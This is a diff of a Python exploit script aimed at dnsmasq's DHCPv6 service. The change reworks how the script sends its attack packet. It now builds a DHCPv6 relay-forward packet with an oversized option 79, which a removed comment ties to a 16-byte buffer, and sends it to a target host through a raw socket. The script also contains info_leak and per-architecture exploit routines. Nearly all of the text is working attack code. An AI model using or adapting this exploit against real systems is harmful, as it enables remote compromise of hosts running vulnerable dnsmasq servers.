@@ -5,7 +5,7 @@ from argparse import ArgumentParser
 from sys import exit
 from scapy.all import sendp, sniff, Ether, IPv6, UDP, DHCP6_Solicit, DHCP6OptRapidCommit, DHCP6OptOptReq
 from scapy.all import DHCP6OptElapsedTime, DHCP6OptClientId, DHCP6OptIA_NA, DHCP6_Reply, DHCP6OptServerId
-from socket import socket, AF_INET6, SOCK_DGRAM, SOL_SOCKET, SO_RCVBUF, inet_pton
+from socket import socket, AF_INET6, SOCK_DGRAM, SOL_SOCKET, SO_RCVBUF, AF_PACKET, SOCK_RAW, inet_pton
 from random import randint
 from netaddr import EUI
 from tm import ThreadManager
@@ -14,6 +14,7 @@ from binascii import unhexlify
 from ipaddress import IPv6Address
 from os import stat
 from select import select
+from network import IPv6_raw, DHCPv6_raw
 
 tm = ThreadManager(3)
 
@@ -383,6 +384,9 @@ dhcpv6_server_mac = None
 eth = Ether()
 ipv6 = IPv6()
 udp = UDP()
+
+ipv6r = IPv6_raw()
+dhcpv6r = DHCPv6_raw()
 
 host = str(args.target)
 port = int(args.target_port)
@@ -813,6 +817,7 @@ def info_leak():
 
 def exploit():
     option_79 = ""
+
     if architecture == "i386":
 
         interpreter_addr = DATA[architecture][dnsmasq_version]
@@ -945,30 +950,25 @@ def exploit():
         print Base.c_error + "This architecture: " + architecture + " not yet supported!"
         exit(1)
 
-    pkg = b"".join([
-        Base.pack8(12),       # DHCP6RELAYFORW
-        Base.pack16(0x0313),  #
-        Base.pack8(0x37),     # transaction ID
-        b"_" * (34 - 4),      #
-        # Option 79 = OPTION6_CLIENT_MAC
-        # Moves argument into char[DHCP_CHADDR_MAX], DHCP_CHADDR_MAX = 16
-        gen_option(79, option_79),
-    ])
+    link_addr = ipv6r.get_random_ip(7, "1337:")
+    peer_addr = ipv6r.get_random_ip(7, "1337:")
+    options = {79: option_79}
 
-    eth.src = macsrc
-    eth.dst = dhcpv6_server_mac
-
-    ipv6.src = ipv6src
-    ipv6.dst = host
-
-    udp.sport = 546
-    udp.dport = 547
-
-    pkt = eth / ipv6 / udp / pkg
-
+    pkt = dhcpv6r.make_relay_forw_packet(ethernet_src_mac=macsrc,
+                                         ethernet_dst_mac="ff:ff:ff:ff:ff:ff",
+                                         ipv6_src=ipv6src,
+                                         ipv6_dst=host,
+                                         ipv6_flow=0,
+                                         hop_count=3,
+                                         link_addr=link_addr,
+                                         peer_addr=peer_addr,
+                                         options=options)
     try:
-        sendp(pkt, iface=current_network_interface, verbose=False)
+        SOCK = socket(AF_PACKET, SOCK_RAW)
+        SOCK.bind((current_network_interface, 0))
+        SOCK.send(pkt)
         print Base.c_success + "Send exploit request to: [" + host + "]:" + str(udp.dport)
+        SOCK.close()
     except:
         print Base.c_error + "Do not send exploit request."
         exit(1)
